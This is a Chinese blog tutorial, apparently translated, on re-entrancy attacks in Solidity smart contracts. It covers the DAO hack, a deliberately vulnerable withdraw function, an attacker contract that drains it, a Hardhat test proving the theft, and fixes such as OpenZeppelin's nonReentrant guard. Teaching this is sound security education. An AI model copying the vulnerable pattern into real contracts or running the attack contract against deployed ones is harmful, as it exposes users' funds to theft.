---
title: Web3系列教程之高级篇---3：重入（Re-Entrancy）攻击
description: null
author: 李留白
weight: 0
date: 2022-08-02T14:19:32.313Z
lastmod: 2022-08-02T14:20:04.112Z
tags: []
categories:
  - 区块链
  - WEB3.0
featuredImage: https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/R3RYera.png
---

Re-Entrancy是智能合约中发现的最古老的安全漏洞之一。正是这个漏洞导致了2016年臭名昭著的 "DAO黑客 "事件。在这次黑客攻击中，超过360万ETH被盗，如今价值数十亿美元。🤯

当时，由于以太坊相对较新，DAO包含了网络上所有以太坊的15%。这次失败对以太坊网络产生了负面影响，Vitalik Buterin提出了一个软件分叉，攻击者将永远无法转移出他的ETH。有些人同意，有些人不同意。这是一个极具争议性的事件，而且至今仍充满争议。

最后，它导致以太坊被分叉成两个--以太坊经典，以及我们今天所知的以太坊。以太坊经典版的区块链在分叉之前与以太坊完全相同，但之后的发展就像黑客攻击确实发生了一样，攻击者仍然控制着被盗资金。今天的以太坊实施了黑名单，就好像那次攻击从未发生过一样。🤔

这是那个故事的简化版，整个过程是相当复杂的。每个人都进退两难。[你可以在这里阅读更多关于这个故事的内容，以了解更详细的情况](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/)

让我们了解更多有关此攻击的信息！🚀

## 什么是 重入攻击?

![](https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/20220802215834.png)

Re-Entrancy是一个漏洞，如果合同A调用合同B中的一个函数，那么合同B可以在合同A仍在处理时回调到合同A。

这可能会导致智能合约的一些严重漏洞，往往会产生从合约中抽走资金的可能性。

让我们通过上图中所示的示例来了解这是如何工作的。假设合约A有一个函数，称之为`f（）`，它有三个功能：

- 检查合约B存入合约A的ETH余额

- 将ETH发送回合约B

- 将合约B的余额更新为0


由于ETH发送后余额会更新，合约B可以在这里做一些棘手的事情。如果合约B在其合同中创建一个`fallback（）`或`receive（）`函数，该函数在收到ETH时执行，那么它可以再次调用合约a中的`f（）`。

由于合约A当时还没有将合约B的余额更新为0，它会再次将ETH发送给合约B——这就是漏洞所在，合约B可以持续这样做，直到合约A完全超出ETH。

## 构建

我们将创建几个智能合约，`GoodContract`和`BadContract`来演示这种行为。`BadContract`将能够从`GoodContract`中抽取所有的ETH。

让我们构建一个示例，让您体验重入攻击是如何发生的。

- 要设置一个Hardhat项目，请打开终端并执行这些命令

```bash
npm init --yes
npm install --save-dev hardhat
```

- 如果你使用的是Windows系统，请做这个额外的步骤，同时安装这些库 :)

```
npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
```

- 在你安装Hardhat的同一目录下运行。

```bash
npx hardhat
```

- 选择`Create a basic sample project`
- 对已指定的`Hardhat Project root`按回车键
- 如果你想添加一个`.gitignore`，请按回车键。
- 按回车键`Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?`

现在你有一个准备好的hardhat项目了!

让我们先在`contracts`目录下创建一个新文件，名为`GoodContract.sol`。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract GoodContract {

    mapping(address => uint) public balances;

    // Update the `balances` mapping to include the new ETH deposited by msg.sender
    function addBalance() public payable {
        balances[msg.sender] += msg.value;
    }

    // Send ETH worth `balances[msg.sender]` back to msg.sender
    function withdraw() public {
        require(balances[msg.sender] > 0);
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "Failed to send ether");
        // This code becomes unreachable because the contract's balance is drained
        // before user's balance could have been set to 0
        balances[msg.sender] = 0;
    }
}
```

该合约非常简单。第一个函数，`addBalance`更新一个映射，以反映另一个地址向该合约存入多少ETH。第二个函数`withdraw`，允许用户提取他们的ETH回来 - 但ETH是在更新余额之前发送的。

现在让我们在`contracts `目录下创建另一个文件，称为`BadContract.sol`。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./GoodContract.sol";

contract BadContract {
    GoodContract public goodContract;
    constructor(address _goodContractAddress) {
        goodContract = GoodContract(_goodContractAddress);
    }

    // Function to receive Ether
    receive() external payable {
        if(address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }

    // Starts the attack
    function attack() public payable {
        goodContract.addBalance{value: msg.value}();
        goodContract.withdraw();
    }
}
```

这个合约要有趣得多，让我们了解一下是怎么回事。

在构造函数中，该合约设置了`GoodContract`的地址并初始化了它的一个实例。

`attack`函数是一个`payable`函数，它从攻击者那里获取一些ETH，将其存入`GoodContract`，然后调用`GoodContract`中的`withdraw`函数。

此时，`GoodContract`将看到`BadContract`的余额大于0，所以它将向`BadContract`反回一些ETH。然而，这样做将触发`BadContract`的`receive()`函数。

`receive()`函数将检查`GoodContrac`t是否仍有大于0的ETH余额，并再次调用`GoodContract`中的`withdraw`函数。

这将形成一个循环，`GoodContract`将不断向`BadContract`发送资金，直到它的资金完全耗尽，然后最终达到将`BadContract`的余额更新为0并完成交易执行。此时，由于重入，攻击者已经成功地从`GoodContract`窃取了所有的ETH。

我们将利用Hardhat测试来证明这种攻击确实有效，以确保`BadContract`确实在消耗`GoodContract`的所有资金。你可以阅读[Hardhat Docs for Testing](https://hardhat.org/tutorial/testing-contracts.html)，以熟悉测试环境。

让我们首先在测试文件夹下创建一个名为`attack.js`的文件，并在那里添加以下代码。

```js
const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { parseEther } = require("ethers/lib/utils");
const { ethers } = require("hardhat");

describe("Attack", function () {
  it("Should empty the balance of the good contract", async function () {
    // Deploy the good contract
    const goodContractFactory = await ethers.getContractFactory("GoodContract");
    const goodContract = await goodContractFactory.deploy();
    await goodContract.deployed();

    //Deploy the bad contract
    const badContractFactory = await ethers.getContractFactory("BadContract");
    const badContract = await badContractFactory.deploy(goodContract.address);
    await badContract.deployed();

    // Get two addresses, treat one as innocent user and one as attacker
    const [_, innocentAddress, attackerAddress] = await ethers.getSigners();

    // Innocent User deposits 10 ETH into GoodContract
    let tx = await goodContract.connect(innocentAddress).addBalance({
      value: parseEther("10"),
    });
    await tx.wait();

    // Check that at this point the GoodContract's balance is 10 ETH
    let balanceETH = await ethers.provider.getBalance(goodContract.address);
    expect(balanceETH).to.equal(parseEther("10"));

    // Attacker calls the `attack` function on BadContract
    // and sends 1 ETH
    tx = await badContract.connect(attackerAddress).attack({
      value: parseEther("1"),
    });
    await tx.wait();

    // Balance of the GoodContract's address is now zero
    balanceETH = await ethers.provider.getBalance(goodContract.address);
    expect(balanceETH).to.equal(BigNumber.from("0"));

    // Balance of BadContract is now 11 ETH (10 ETH stolen + 1 ETH from attacker)
    balanceETH = await ethers.provider.getBalance(badContract.address);
    expect(balanceETH).to.equal(parseEther("11"));
  });
});
```

在这项测试中，我们首先部署了`GoodContract`和`BadContract`。

然后我们从Hardhat获得两个签名者--测试账户让我们访问10个账户，这些账户都是预先用ETH资助的。我们将其中一个作为无辜的用户，另一个作为攻击者。

我们让无辜的用户发送10个ETH到`GoodContract`。然后，攻击者通过对`BadContract`调用`attack()`并向其发送1个ETH开始攻击。

最后执行测试，在你的终端输入。

```
npx hardhat test
```

如果你的所有测试都通过了，那么攻击就成功了

## 预防

有两件事你可以做。

或者，你可以认识到这个函数容易受到重入的影响，并确保你在实际向用户发送ETH之前，在`withdraw`函数中更新用户的余额，所以如果他们试图回调到`withdraw`，就会失败。

另外，`OpenZeppelin`有一个`ReentrancyGuard`库，它提供了一个名为`nonReentrant`的修改器，在你应用它的函数中阻止重入。它的工作原理基本如下。

```solidity
modifier nonReentrant() {
    require(!locked, "No re-entrancy");
    locked = true;
    _;
    locked = false;
}
```

如果你在`withdraw`函数上应用这一点，那么回调到`withdraw`的过程将会失败，因为在第一个`withdraw`函数执行完毕之前，`locked`将等于`true`，从而也阻止了重入。

## 阅读

这些是可选的，但建议阅读的内容

- [DAO Hack](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/)
- [Reentrancy Guard Library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol)
- [Hardhat Testing](https://hardhat.org/tutorial/testing-contracts.html)

> 原文：[https://www.learnweb3.io/tracks/senior/re-entrancy](https://www.learnweb3.io/tracks/senior/re-entrancy)

![](https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/my.png)